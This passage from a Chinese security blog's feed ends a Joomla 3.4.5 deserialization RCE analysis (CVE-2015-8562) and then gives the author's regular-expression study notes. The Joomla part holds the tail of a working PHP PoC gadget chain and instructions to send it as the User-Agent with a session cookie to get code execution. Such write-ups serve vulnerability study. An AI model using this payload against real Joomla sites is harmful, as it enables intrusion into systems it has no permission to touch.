class="variable">$disconnectHandlers</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$connection</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> JSimplepieFactory();</span><br><span class="line">        <span class="variable">$x</span> = <span class="keyword">new</span> SimplePie();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connection = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;disconnectHandlers = [</span><br><span class="line">            [<span class="variable">$x</span>, <span class="string">&quot;init&quot;</span>],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> JDatabaseDriverMysqli();</span><br><span class="line"><span class="variable">$poc</span> = serialize(<span class="variable">$a</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$poc</span> = str_replace(<span class="string">&quot;\x00*\x00&quot;</span>, <span class="string">&#x27;\\0\\0\\0&#x27;</span>, <span class="variable">$poc</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;123&#125;__test|<span class="subst">&#123;$poc&#125;</span>\xF0\x9D\x8C\x86&quot;</span>;</span><br></pre></td></tr></table></figure><p>将生成好的POC作为User-Agent，带上第一步获取的Cookie发包，这一次发包，脏<strong>数据进入Mysql数据库</strong>。</p><p>然后同样的包<strong>再发一次</strong>，我们的代码被执行：</p><p><img src="https://i.loli.net/2021/02/13/Lhlf4DN5pH7erMv.png"></p><p>参考</p><p><a href="https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html#session">Joomla远程代码执行漏洞分析（总结） | 离别歌 (leavesongs.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/64017530">Joomla 3.4.5 反序列化漏洞（CVE-2015-8562) 分析 - 知乎 (zhihu.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> cms </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习正则表达式的一些笔记</title>
      <link href="2021/02/05/%E5%AD%A6%E4%B9%A0%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/"/>
      <url>2021/02/05/%E5%AD%A6%E4%B9%A0%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>emmm虽然正则表达式好像不是特别急需，但后面还是需要学的=-=，就在吃喝玩乐睡的假期抽空学习一下。<br>本章是阅读《正则表达式30分钟入门》的笔记</p><h1 id="笔记咯"><a href="#笔记咯" class="headerlink" title="笔记咯"></a>笔记咯</h1><h2 id="界定符"><a href="#界定符" class="headerlink" title="界定符"></a>界定符</h2><p>指定正则表达式的开始和结束，可以当成是计算机语言中的大括号<code>&#123;</code>和<code>&#125;</code>。一般有三种表现方式：</p><ul><li>斜杠。例如<code>/[0-9]/</code>。这是最常用的方式，在PHP中，推荐使用这种方式。</li><li>井号。例如<code>#[0-9]</code>。</li><li>大括号。例如<code>&#123;[0-9]&#125;</code>。在正则表达式中，大括号还有其他作用，所以这种方式不推荐使用。</li></ul><h2 id="修饰符-修正模式"><a href="#修饰符-修正模式" class="headerlink" title="修饰符 | 修正模式"></a>修饰符 | 修正模式</h2><p>给正则表达式的匹配过程添加一种匹配模式，一般加在屁股比如：<code>/[a-z]/i</code></p><ul><li><code>U</code> 加<code>U</code>是懒惰匹配，不加<code>U</code>是默认的贪婪匹配。</li><li><code>i</code> 忽略英文字母大小写。</li><li><code>x</code> 忽略空白。（包括空格和按tab键输出的制表符）</li><li><code>s</code> 让元字符<code>.</code>匹配包括换行符在内的所有字符。</li><li><code>A</code>强制从目标字符串开头匹配</li><li><code>e</code> <code>preg_replace()</code>在替换字符串中对逆向引用作正常的替换。简单的说，就是PHP会把replace的结果当做PHP代码。（替换字符串要符合php的语法规范）<br>例如：<code>echo preg_replace(&#39;/(\d+),(\d+)/e&#39;, &#39;$1+$2&#39;, &#39;2,3&#39;);</code>会输出<code>5</code></li><li><code>g</code>全局匹配(但只匹单行)<br>若不带g，正则过程中字符串从左到右匹配，找到第一个符合条件的即匹配成功并返回<br>若带g，则字符串从左到右，找到每个符合条件的都记录下来，直到字符串结尾位置</li><li><code>m</code>多行匹配：若存在换行<code>\n</code>并且有开始<code>^</code>或结束<code>$</code>符的情况下，和<code>g</code>一起使用实现全局匹配。<br>存在换行时默认会把换行符作为一个字符任务匹配。<br>g只匹配第一行，添加m之后实现多行，每个换行符之后作为新的匹配起始</li></ul><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><p><code>.</code> ：匹配除换行符以外的任意字符<br><code>\w</code>：匹配字母或数字或下划线或汉字等<br><code>\s</code>：匹配任意的空白符，包括空格，制表符(Tab)，换行符，中文全角空格 等<br><code>\d</code>：匹配一位数字<br><code>\b</code>：匹配单词的开始或结束。匹配这样一个位置：它的前一个字符和后一个字符不全是\w（一个是，一个不是或不存在）<br><code>^</code>：匹配字符串开始<br><code>$</code>：匹配字符串结束<br><code>(</code>和<code>)</code>：小括号有很多妙用，看下面吧</p><h2 id="反义"><a href="#反义" class="headerlink" title="反义"></a>反义</h2><p><code>\W</code> 匹配任意不是字母，数字，下划线，汉字的字符<br><code>\S</code> 匹配任意不是空白符的字符<br><code>\D</code> 匹配任意非数字的字符<br><code>\B</code> 匹配不是单词开头或结束的位置<br><code>[\^x]</code> 匹配除了x以外的任意字符<br><code>[\^aeiou]</code> 匹配除了aeiou这几个字母以外的任意字符</p><h2 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h2><p><code>*</code> ：任意数量；重复0次或很多次<br><code>+</code>：&gt;=1次；重复1次或很多次<br><code>?</code>：0 or 1；重复0次或1次<br><code>&#123;n&#125;</code>：n次；如：\d{2}（表示\d重复匹配2次）；<br><code>&#123;n,&#125;</code>：&gt;=n次；重复n次或更多次<br><code>&#123;n,m&#125;</code>：重复n到m次；重复次数不少于n，不大于m</p><h2 id="字符转义"><a href="#字符转义" class="headerlink" title="字符转义"></a>字符转义</h2><p>若需要查找元字符本身如<code>.</code>、<code>*</code>这些，需要用<code>\</code>来将这些字符的特殊意义取消掉：如<code>\.</code>、<code>\*</code>；当然查找<code>\</code>本身也需要转义为<code>\\</code></p><h2 id="正则表达式字符类备忘单"><a href="#正则表达式字符类备忘单" class="headerlink" title="正则表达式字符类备忘单"></a>正则表达式字符类备忘单</h2><p>打ctf的时候碰到的正则匹配<br>ps：不过这个好像不是所有语言都适用？在使用正则测试小工具测试payload的时候就没能识别</p><p><code>[:alpha:]</code>任意字母, <code>[A-Za-z]</code><br><code>[:upper:]</code>任意大写字母, <code>[A-Z]</code><br><code>[:lower:]</code>任意小写字母, <code>[a-z]</code><br><code>[:digit:]</code>任意数字, <code>[0-9]</code><br><code>[:alnum:]</code>任意字符字母数字,  <code>[A-Za-z0-9]</code><br><code>[:xdigit:]</code>任意十六进制数字, <code>[0-9A-Fa-f]</code><br><code>[:space:]</code>制表符，换行符，垂直制表符，换页，回车或空格<br><code>[:blank:]</code>空格或制表符<br><code>[:print:]</code>任意可打印字符<br><code>[:punct:]</code>任意标点符号: <code>! &#39; # S % &amp; &#39; ( ) * + , - . / : ; &lt; = &gt; ? @ [ / ] ^ _ &#123; | &#125; ~</code><br><code>[:graph:]</code>除space类之外的任意字符<br><code>[:word:]</code>字母数字字符和下划线的连续字符串<br><code>[:ascii:]</code>ASCII字符，范围：0-127<br><code>[:cntrl:]</code>任何不属于字符类的字符: <code>[:upper:], [:lower:], [:alpha:], [:digit:], [:punct:], [:graph:], [:print:], [:xdigit:]</code></p><h2 id="查找字符类"><a href="#查找字符类" class="headerlink" title="查找字符类"></a>查找字符类</h2><p>如查找abcde，只需在方括号中列出<code>[abcde]</code>;那么就构造了这样一个只会匹配abcde的字符集，数量由其后的重复次数决定</p><p>也可以指定范围：<br>[0-9] 代表的含意与 \d 就是完全一致的：一位 数字；<br>[a-z0-9A-Z_] 也完全等同于 \w （如果只考虑英文的话）。</p><h2 id="分支条件"><a href="#分支条件" class="headerlink" title="分支条件"></a>分支条件</h2><p>正则表达式里的分枝条件指的是有几种规则，如果满足其中任意一种规则都会进行匹配，具体方法是用 <code>|</code> 把不同的规则分隔开。如a | b，只要满足其中之一，都会进行匹配</p><h2 id="分组-子表达式"><a href="#分组-子表达式" class="headerlink" title="分组(子表达式)"></a>分组(子表达式)</h2><p>想要重复多个字符时，需要先用小括号进行分组，然后再指定这个分组的重复次数。<br>eg：<br><code>(\d&#123;1,3&#125;\.)&#123;3&#125;\d&#123;1,3&#125;</code><br>是一个简单的 IP 地址匹配表达式。<br>按下列顺序分析它：<br><code>\d&#123;1,3&#125;</code>匹配 1到3位的数字，<br> <code>(\d&#123;1,3&#125;\.)&#123;3&#125; </code>匹配三位数字加上一个英文句号(这个整体也就是这个分组) 重复3次，<br>最后再加上一个一到三位的数字 <code>(\d&#123;1,3&#125;)</code> 。</p><p>IP地址中每个数字都不能大于255 且 01.02.03.04 这样前面带有0的数字, 也是正确的IP地址，IP 地址里的数字可以包含有前导 0 (leading zeroes).<br>不过上述正则表达式也会匹配 256.300.888.999 这种不可能存在的IP地址。<br>如果能使用算术比较的话，或许能简单地解决这个问题，但是正则表达式中并不提供关于数学的任何功能<br>所以只能使用冗长的分组，选择，字符类来描述一个正确的IP地址：<br><code>((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)</code></p><p>理解这个表达式的关键是理解 <code>2[0-4]\d|25[0-5]|[01]?\d\d?</code></p><p>解析：分成三部分：<code>2[0-4]\d</code>、<code>25[0-5]</code>、<code>[01]?\d\d?</code><br><code>2[0-4]\d</code>：<strong>2</strong> + <strong>[0-4]中的任一个</strong> + <strong>任意数字</strong>；即：200-209、210-219、220-229、230-239、240-249<br><code>25[0-5]：</code>：<strong>25</strong> + <strong>[0-5]任一个</strong>；即：250-255<br><code>[01]?\d\d?：</code>：**[01]?**  +  <strong>\d</strong>  +  <strong>\d?</strong>;即0/1(不匹配或匹配1次)，加上任一数字，加上任一数字(不匹配或匹配1次)</p><h2 id="后向引用"><a href="#后向引用" class="headerlink" title="后向引用"></a>后向引用</h2><p>使用小括号指定一个子表达式后，匹配这个子表达式的文本(也就是此分组捕获的内容)可以在表达式或其它程序中作进一步的处理。<br>也就是说可以对分组匹配到的文字进行处理</p><p>默认情况下，每个分组会自动拥有一个组号，规则是：从左向右，以分组的左括号为标志，第一个出现的分组的组号为1，第二个为2，以此类推。</p><p>后向引用用于重复搜索前面某个分组匹配的文本。<br>例如：<br> <code>\1</code> 代表分组1匹配的文本。<br>示例： <code>\b(\w+)\b\s+\1\b</code>  就可以可以用来匹配重复的单词，像go go, 或者kitty kitty。</p><p>解析：<br><code>(\b(\w+)\b)</code> :首先是一个单词（这个单词会被捕获到编号为1的分组中），也就是单词开始处和结束处之间数量多于一个的字母或数字<br><code>(\s+)</code> ：然后是1个或几个空白符<br> <code>(\1)</code> ：最后是分组1中捕获的内容（也就是前面匹配的那个单词）</p><h3 id="自定义子表达式的组名"><a href="#自定义子表达式的组名" class="headerlink" title="自定义子表达式的组名"></a>自定义子表达式的组名</h3><p>子表达式的组名也可以自己定义：</p><p>使用语法形如： <code>(? &lt;Word&gt;\w+)</code> (或者把尖括号换成’也行： <code>(?&#39;Word&#39;\w+)</code>)<br>这样就把 <code>\w+</code> 的组名指定为 <code>Word</code> 了。</p><p>反向引用时：<code>\k&lt;Word&gt;</code></p><p>由此可以将上面的例子<code>\b(\w+)\b\s+\1\b</code>写为<code>\b(?&lt;Word&gt;\w+)\b\s+\k&lt;Word&gt;\b</code></p><h3 id="使用-的一些常用的特定语法"><a href="#使用-的一些常用的特定语法" class="headerlink" title="使用 () 的一些常用的特定语法"></a>使用 () 的一些常用的特定语法</h3><table><thead><tr><th>分类</th><th align="center">代码**/**语法</th><th align="center">说明</th></tr></thead><tbody><tr><td>捕获</td><td align="center">(exp)</td><td align="center">匹配exp,并捕获文本到<strong>自动命名</strong>的组里</td></tr><tr><td></td><td align="center">(?exp) or (?’name’exp)</td><td align="center">匹配exp,并捕获文本到名称为name的组里</td></tr><tr><td></td><td align="center">(?:exp)</td><td align="center">匹配exp,<strong>不捕获</strong>匹配的文本，也<strong>不给此分组分配组号</strong></td></tr><tr><td>零宽断言</td><td align="center">(?=exp)</td><td align="center">匹配<strong>exp前面</strong>的位置</td></tr><tr><td></td><td align="center">(?&lt;=exp)</td><td align="center">匹配<strong>exp后面</strong>的位置</td></tr><tr><td></td><td align="center">(?!exp)</td><td align="center">匹配<strong>后面</strong>跟的<strong>不是exp</strong>的位置</td></tr><tr><td></td><td align="center">(?&lt;!exp)</td><td align="center">匹配<strong>前面不是exp</strong>的位置</td></tr><tr><td>注释</td><td align="center">(?#comment)</td><td align="center">这种类型的分组不对正则表达式的处理产生任何影响，用于<strong>提供注释</strong>让人阅读</td></tr></tbody></table><h2 id="零宽断言"><a href="#零宽断言" class="headerlink" title="零宽断言"></a>零宽断言</h2><p>就是用于查找在某些内容(不包括这些内容)之前或之后的东西，即指定内容前/后的位置，并且该位置需满足一定条件（断言）；故综合称之为零宽断言。</p><p><code>(?=exp)</code>（零宽度<strong>正</strong>预测<strong>先行</strong>断言）：断言自身出现的位置的<strong>后面</strong>能匹配表达式exp</p><blockquote><p>比如：<code>\b\w+(?=ing\b)</code>，匹配<strong>以ing结尾</strong>的单词的前面部分(<strong>除了ing以外的部分</strong>)，</p><p>如查找<em>I’m singing while you’re dancing.<em>时，它会匹配</em></em>sing<strong>和</strong>danc**。</p></blockquote><p><code>(?&lt;=exp)</code>（零宽度<strong>正</strong>回顾<strong>后发</strong>断言）：断言自身出现的位置的<strong>前面</strong>能匹配表达式 exp</p><blockquote><p>比如：<code>(?&lt;=\bre)\w+\b</code>会匹配<strong>以re开头</strong>的单词的后半部分(<strong>除了re以外的部分</strong>)，</p><p>例如在查找<em>reading a book</em>时，它匹配<strong>ading</strong>。</p></blockquote><h2 id="负向零宽断言"><a href="#负向零宽断言" class="headerlink" title="负向零宽断言"></a>负向零宽断言</h2><p><code>(?!exp)</code>（零宽度<strong>负</strong>预测<strong>先行</strong>断言）：断言此位置的<strong>后面不能匹配</strong>表达式exp</p><blockquote><p>比如：</p><p><code>\d&#123;3&#125;(?!\d)</code>匹配三位数字，而且这三位数字的后面不能是数字；</p><p><code>\b((?!abc)\w)+\b</code>匹配不包含连续字符串abc的单词。</p></blockquote><p><code>(?&lt;!exp)</code>（零宽度<strong>负</strong>回顾<strong>后发</strong>断言）：断言此位置的<strong>前面不能匹配</strong>表达式exp</p><blockquote><p>比如：</p><p><code>(?&lt;![a-z])\d&#123;7&#125;</code>匹配前面不是小写字母的七位数字。</p><p><code>(?&lt;=&lt;(\w+)&gt;).*(?=&lt;\/\1&gt;)</code>匹配不包含属性的简单HTML标签内里的内容</p><p>解析：<br><code>(?&lt;=&lt;(\w+)&gt;)</code>指定了<strong>前缀</strong>：被尖括号括起来的单词(比如可能是<code>&lt;b&gt;</code>)，<br><code>.</code> <code>*</code>(任意的字符串),最后是一个<strong>后缀</strong><code>(?=&lt;\/\1&gt;)</code>。<br>后缀里的<code>\/</code>用到了前面提过的字符转义；<br><code>\1</code>是一个反向引用，引用捕获的第一组，前面 <code>(\w+)</code> 匹配的内容</p><p>这样如果前缀实际上是 <code>&lt;b&gt;</code> 的话，后缀就是 <code>&lt;/b&gt;</code> 了。</p><p>整个表达式匹配的是 <code>&lt;b&gt;</code> 和 <code>&lt;/b&gt;</code> 之间的内容(不包括前缀和后缀本身)。</p></blockquote><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>通过语法<code>(?#comment)</code>来包含注释</p><blockquote><p>比如：<code>2[0-4]\d(?#200-249)|25[0-5](?#250-255)|[01]?\d\d?(?#0-199)</code></p></blockquote><p>要包含注释的话，最好是启用“忽略模式里的空白符”选项，这样在编写表达式时能任意的添加空格，Tab，换行，而实际使用时这些都将被忽略。<br>启用这个选项后，在#后面到这一行结束的所有文本都将被当成注释忽略掉。</p><p>例如，我们可以将前面的一个表达式写成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(?&lt;&#x3D;    # 断言要匹配的文本的前缀</span><br><span class="line">&lt;(\w+)&gt; # 查找尖括号括起来的内容</span><br><span class="line">        # (即HTML&#x2F;XML标签)</span><br><span class="line">)       # 前缀结束</span><br><span class="line">.*      # 匹配任意文本</span><br><span class="line">(?&#x3D;     # 断言要匹配的文本的后缀</span><br><span class="line">&lt;\&#x2F;\1&gt;  # 查找尖括号括起来的内容</span><br><span class="line">        # 查找尖括号括起来的内容</span><br><span class="line">)       # 后缀结束</span><br></pre></td></tr></table></figure><h2 id="贪婪与懒惰"><a href="#贪婪与懒惰" class="headerlink" title="贪婪与懒惰"></a>贪婪与懒惰</h2><h3 id="贪婪匹配"><a href="#贪婪匹配" class="headerlink" title="贪婪匹配"></a>贪婪匹配</h3><p>当正则表达式中包含能接受重复的限定符时，通常的行为是匹配尽可能多的字符（在使整个表达式能得到匹配的前提下）</p><p>如：<code>a.*b</code>会匹配最长的  以a开始，b结束  的字符串；<br>当以此对aabab进行搜索，就会匹配整个字符串aabab</p><h3 id="懒惰匹配"><a href="#懒惰匹配" class="headerlink" title="懒惰匹配"></a>懒惰匹配</h3><p>也就是是匹配尽可能少的字符。<br>只需在限定符后加上<code>?</code>即可转换为懒惰匹配模式</p><p>如<code>a.*?b</code>匹配最短的  以a开始，b结束  的字符串；<br>当以此对aabab进行搜索，就会匹配aab和ab</p><h4 id="懒惰限定符："><a href="#懒惰限定符：" class="headerlink" title="懒惰限定符："></a>懒惰限定符：</h4><table><thead><tr><th>代码**/**语法</th><th align="left">说明</th></tr></thead><tbody><tr><td>*?</td><td align="left">重复任意次，但尽可能少重复</td></tr><tr><td>+?</td><td align="left">重复1次或更多次，但尽可能少重复</td></tr><tr><td>??</td><td align="left">重复0次或1次，但尽可能少重复</td></tr><tr><td>{n,m}?</td><td align="left">重复n到m次，但尽可能少重复</td></tr><tr><td>{n,}?</td><td align="left">重复n次以上，但尽可能少重复</td></tr></tbody></table><h2 id="处理选项（基于python）"><a href="#处理选项（基于python）" class="headerlink" title="处理选项（基于python）"></a>处理选项（基于python）</h2><p>Python 中常用的正则表达式选项（用到re模块！）：</p><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>re.IGNORECASE</td><td>匹配时不区分大小写。</td></tr><tr><td>re.MULTILINE</td><td>更改^和$的含义，使它们分别在任意一行的行首和行尾匹配，而不仅仅在整个字符串的开头和结尾匹配。(在此模式下,$的精确含意是:匹配\n之前的位置以及字符串结束前的位置.)</td></tr><tr><td>re.DOTALL</td><td>更改.的含义，使它与每一个字符匹配（包括换行符\n）。</td></tr><tr><td>re.VERBOSE</td><td>忽略表达式中的非转义空白并启用由#标记的注释。</td></tr><tr><td>re.DEBUG</td><td>显示编译表达式的 debug 信息</td></tr></tbody></table><h2 id="平衡组-amp-递归匹配"><a href="#平衡组-amp-递归匹配" class="headerlink" title="平衡组&amp;递归匹配"></a>平衡组&amp;递归匹配</h2><p><strong>使用场景</strong>：匹配嵌套字符串，如匹配类中的大括号，HTML中的尖括号等</p><p><code>(?&#39;group&#39;)</code> 把捕获的内容命名为group,并压入堆栈(Stack) </p><p><code>(?&#39;-group&#39;)</code> 从堆栈上弹出最后压入堆栈的名为group的捕获内容，如果堆栈本来为空，则本分组的匹配失败 </p><p><code>(?(group)yes|no)</code> 如果堆栈上存在以名为group的捕获内容的话，继续匹配yes部分的表达式，否则继续匹配no部分 </p><p><code>(?!)</code> 零宽负向先行断言，由于没有后缀表达式，试图匹配总是失败</p><p>我们要做的是：</p><p>每碰到了左括号，就在压入一个”Open”, 每碰到一个右括号，就弹出一个，到了最后就看看堆栈是否为空；</p><p>不为空  -》证明左括号比右括号多，那匹配就应该失败。</p><p>正则表达式引擎会进行回溯(放弃最前面或最后面的一些字符)，尽量使整个表达式得到匹配</p><h2 id="正则表达式手册"><a href="#正则表达式手册" class="headerlink" title="正则表达式手册"></a>正则表达式手册</h2><h3 id="表达式全集"><a href="#表达式全集" class="headerlink" title="表达式全集"></a>表达式全集</h3><table><thead><tr><th align="center">字符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">\</td><td align="center">将下一个字符标记为一个特殊字符、或一个原义字符、或一个向后引用、或一个八进制转义符。例如，“<code>n</code>”匹配字符“<code>n</code>”。“<code>\n</code>”匹配一个换行符。串行“<code>\\</code>”匹配“<code>\</code>”而“<code>\(</code>”则匹配“<code>(</code>”。</td></tr><tr><td align="center">^</td><td align="center">匹配输入字符串的开始位置。如果设置了RegExp对象的Multiline属性，^也匹配“<code>\n</code>”或“<code>\r</code>”之后的位置。</td></tr><tr><td align="center">$</td><td align="center">匹配输入字符串的结束位置。如果设置了RegExp对象的Multiline属性，$也匹配“<code>\n</code>”或“<code>\r</code>”之前的位置。</td></tr><tr><td align="center">*</td><td align="center">匹配前面的子表达式零次或多次。例如，zo<em>能匹配“<code>z</code>”以及“<code>zoo</code>”。</em>等价于{0,}。</td></tr><tr><td align="center">+</td><td align="center">匹配前面的子表达式一次或多次。例如，“<code>zo+</code>”能匹配“<code>zo</code>”以及“<code>zoo</code>”，但不能匹配“<code>z</code>”。+等价于{1,}。</td></tr><tr><td align="center">?</td><td align="center">匹配前面的子表达式零次或一次。例如，“<code>do(es)?</code>”可以匹配“<code>does</code>”或“<code>does</code>”中的“<code>do</code>”。?等价于{0,1}。</td></tr><tr><td align="center">{<em>n</em>}</td><td align="center"><em>n</em>是一个非负整数。匹配确定的<em>n</em>次。例如，“<code>o&#123;2&#125;</code>”不能匹配“<code>Bob</code>”中的“<code>o</code>”，但是能匹配“<code>food</code>”中的两个o。</td></tr><tr><td align="center">{<em>n</em>,}</td><td align="center"><em>n</em>是一个非负整数。至少匹配<em>n</em>次。例如，“<code>o&#123;2,&#125;</code>”不能匹配“<code>Bob</code>”中的“<code>o</code>”，但能匹配“<code>foooood</code>”中的所有o。“<code>o&#123;1,&#125;</code>”等价于“<code>o+</code>”。“<code>o&#123;0,&#125;</code>”则等价于“<code>o*</code>”。</td></tr><tr><td align="center">{<em>n</em>,<em>m</em>}</td><td align="center"><em>m</em>和<em>n</em>均为非负整数，其中<em>n</em>&lt;=<em>m</em>。最少匹配<em>n</em>次且最多匹配<em>m</em>次。例如，“<code>o&#123;1,3&#125;</code>”将匹配“<code>fooooood</code>”中的前三个o。“<code>o&#123;0,1&#125;</code>”等价于“<code>o?</code>”。请注意在逗号和两个数之间不能有空格。</td></tr><tr><td align="center">?</td><td align="center">当该字符紧跟在任何一个其他限制符（*,+,?，{<em>n</em>}，{<em>n</em>,}，{<em>n</em>,<em>m</em>}）后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串“<code>oooo</code>”，“<code>o+?</code>”将匹配单个“<code>o</code>”，而“<code>o+</code>”将匹配所有“<code>o</code>”。</td></tr><tr><td align="center">.</td><td align="center">匹配除“<code>\</code>*<code>n</code><em>”之外的任何单个字符。要匹配包括“<code>\</code></em><code>n</code>*”在内的任何字符，请使用像“`(.</td></tr><tr><td align="center">(pattern)</td><td align="center">匹配pattern并获取这一匹配。所获取的匹配可以从产生的Matches集合得到，在VBScript中使用SubMatches集合，在JScript中则使用$0…$9属性。要匹配圆括号字符，请使用“<code>\(</code>”或“<code>\)</code>”。</td></tr><tr><td align="center">(?:pattern)</td><td align="center">匹配pattern但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用或字符“`(</td></tr><tr><td align="center">(?=pattern)</td><td align="center">正向肯定预查，在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，“`Windows(?=95</td></tr><tr><td align="center">(?!pattern)</td><td align="center">正向否定预查，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如“`Windows(?!95</td></tr><tr><td align="center">(?&lt;=pattern)</td><td align="center">反向肯定预查，与正向肯定预查类拟，只是方向相反。例如，“`(?&lt;=95</td></tr><tr><td align="center">(?&lt;!pattern)</td><td align="center">反向否定预查，与正向否定预查类拟，只是方向相反。例如“`(?&lt;!95</td></tr><tr><td align="center">x|y</td><td align="center">匹配x或y。例如，“`z</td></tr><tr><td align="center">[xyz]</td><td align="center">字符集合。匹配所包含的任意一个字符。例如，“<code>[abc]</code>”可以匹配“<code>plain</code>”中的“<code>a</code>”。</td></tr><tr><td align="center">[^xyz]</td><td align="center">负值字符集合。匹配未包含的任意字符。例如，“<code>[^abc]</code>”可以匹配“<code>plain</code>”中的“<code>p</code>”。</td></tr><tr><td align="center">[a-z]</td><td align="center">字符范围。匹配指定范围内的任意字符。例如，“<code>[a-z]</code>”可以匹配“<code>a</code>”到“<code>z</code>”范围内的任意小写字母字符。</td></tr><tr><td align="center">[^a-z]</td><td align="center">负值字符范围。匹配任何不在指定范围内的任意字符。例如，“<code>[^a-z]</code>”可以匹配任何不在“<code>a</code>”到“<code>z</code>”范围内的任意字符。</td></tr><tr><td align="center">\b</td><td align="center">匹配一个单词边界，也就是指单词和空格间的位置。例如，“<code>er\b</code>”可以匹配“<code>never</code>”中的“<code>er</code>”，但不能匹配“<code>verb</code>”中的“<code>er</code>”。</td></tr><tr><td align="center">\B</td><td align="center">匹配非单词边界。“<code>er\B</code>”能匹配“<code>verb</code>”中的“<code>er</code>”，但不能匹配“<code>never</code>”中的“<code>er</code>”。</td></tr><tr><td align="center">\cx</td><td align="center">匹配由x指明的控制字符。例如，\cM匹配一个Control-M或回车符。x的值必须为A-Z或a-z之一。否则，将c视为一个原义的“<code>c</code>”字符。</td></tr><tr><td align="center">\d</td><td align="center">匹配一个数字字符。等价于[0-9]。</td></tr><tr><td align="center">\D</td><td align="center">匹配一个非数字字符。等价于[^0-9]。</td></tr><tr><td align="center">\f</td><td align="center">匹配一个换页符。等价于\x0c和\cL。</td></tr><tr><td align="center">\n</td><td align="center">匹配一个换行符。等价于\x0a和\cJ。</td></tr><tr><td align="center">\r</td><td align="center">匹配一个回车符。等价于\x0d和\cM。</td></tr><tr><td align="center">\s</td><td align="center">匹配任何空白字符，包括空格、制表符、换页符等等。等价于[ \f\n\r\t\v]。</td></tr><tr><td align="center">\S</td><td align="center">匹配任何非空白字符。等价于[^ \f\n\r\t\v]。</td></tr><tr><td align="center">\t</td><td align="center">匹配一个制表符。等价于\x09和\cI。</td></tr><tr><td align="center">\v</td><td align="center">匹配一个垂直制表符。等价于\x0b和\cK。</td></tr><tr><td align="center">\w</td><td align="center">匹配包括下划线的任何单词字符。等价于“<code>[A-Za-z0-9_]</code>”。</td></tr><tr><td align="center">\W</td><td align="center">匹配任何非单词字符。等价于“<code>[^A-Za-z0-9_]</code>”。</td></tr><tr><td align="center">\x<em>n</em></td><td align="center">匹配<em>n</em>，其中<em>n</em>为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，“<code>\x41</code>”匹配“<code>A</code>”。“<code>\x041</code>”则等价于“<code>\x04&amp;1</code>”。正则表达式中可以使用ASCII编码。.</td></tr><tr><td align="center">*num*</td><td align="center">匹配<em>num</em>，其中<em>num</em>是一个正整数。对所获取的匹配的引用。例如，“<code>(.)\1</code>”匹配两个连续的相同字符。</td></tr><tr><td align="center">*n*</td><td align="center">标识一个八进制转义值或一个向后引用。如果*n<em>之前至少</em>n<em>个获取的子表达式，则</em>n<em>为向后引用。否则，如果</em>n<em>为八进制数字（0-7），则</em>n*为一个八进制转义值。</td></tr><tr><td align="center">*nm*</td><td align="center">标识一个八进制转义值或一个向后引用。如果*nm<em>之前至少有</em>nm<em>个获得子表达式，则</em>nm<em>为向后引用。如果\</em>nm<em>之前至少有</em>n<em>个获取，则</em>n<em>为一个后跟文字</em>m<em>的向后引用。如果前面的条件都不满足，若</em>n<em>和</em>m<em>均为八进制数字（0-7），则\</em>nm<em>将匹配八进制转义值</em>nm*。</td></tr><tr><td align="center">*nml*</td><td align="center">如果<em>n</em>为八进制数字（0-3），且<em>m和l</em>均为八进制数字（0-7），则匹配八进制转义值<em>nm</em>l。</td></tr><tr><td align="center">\u<em>n</em></td><td align="center">匹配<em>n</em>，其中<em>n</em>是一个用四个十六进制数字表示的Unicode字符。例如，\u00A9匹配版权符号（©）。</td></tr></tbody></table><h3 id="常用正则表达式"><a href="#常用正则表达式" class="headerlink" title="常用正则表达式"></a>常用正则表达式</h3><table><thead><tr><th align="center">用户名</th><th>/^[a-z0-9_-]{3,16}$/</th></tr></thead><tbody><tr><td align="center">密码</td><td>/^[a-z0-9_-]{6,18}$/</td></tr><tr><td 